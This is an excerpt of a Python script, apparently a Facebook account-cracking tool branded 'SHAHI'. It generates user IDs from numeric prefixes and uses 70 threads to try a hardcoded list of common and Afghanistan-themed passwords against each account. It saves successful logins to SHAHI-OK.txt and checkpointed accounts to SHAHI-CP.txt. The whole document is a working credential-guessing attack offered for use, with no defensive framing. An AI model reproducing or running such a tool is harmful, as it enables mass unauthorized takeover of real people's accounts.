...
→   Github     :  LOVE SHAHI JOKER
→   Tool Type  : SHAHI
\x1b[1;97m→   Version    :  SHAHI
\33[1;37m----------------------------------------------""")
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 93345,93318,93334,****Etc')
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','Afghan100200','Afghan1234','PUBG123','afghanistan','Afghanistan','PUBG1234','افغانستان','khan12','khan123','jan123','asdasd123123','afghan500600','123456789','987654321','۹۸۷۶۵۴۳۲۱','koko1234','facebook','Facebook','FACEBOOK','123123','12341234','707070','pubg123','King100200','king100200','King500600','king500600','khankhan','prince ','prince1212','prince123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'u_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;32m[SHAHI-OK] '+uid+'|'+ps+'\033[0;97m')
                open('SHAHI-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:152]
                print('\033[1;31m[SHAHI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SHAHI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSHAHI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
